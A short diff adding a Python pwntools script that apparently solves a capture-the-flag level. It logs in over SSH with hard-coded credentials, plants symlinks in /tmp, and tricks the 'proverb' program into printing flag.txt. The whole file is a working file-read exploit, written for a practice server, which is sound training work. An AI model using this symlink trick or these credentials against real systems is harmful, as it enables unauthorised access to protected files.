@@ -1,0 +1,16 @@
+#!/usr/bin/python
+# -*- Coding: utf-8 -*-
+
+from pwn import *
+
+s = ssh (host="ctfq.sweetduet.info", port=10022, user="q13", password="8zvWx00MakSCQuGq")
+
+context.log_level = "debug"
+
+target = s.process(['mkdir', '/tmp/okupay'])
+target = s.process(['ln', '-s', '~/proverb', '/tmp/okupay/proverb'])
+target = s.process(['ln', '-s', '~/flag.txt', '/tmp/okupay/proverb.txt'])
+target = s.process(['./proverb'])
+
+print(target.readline())
+
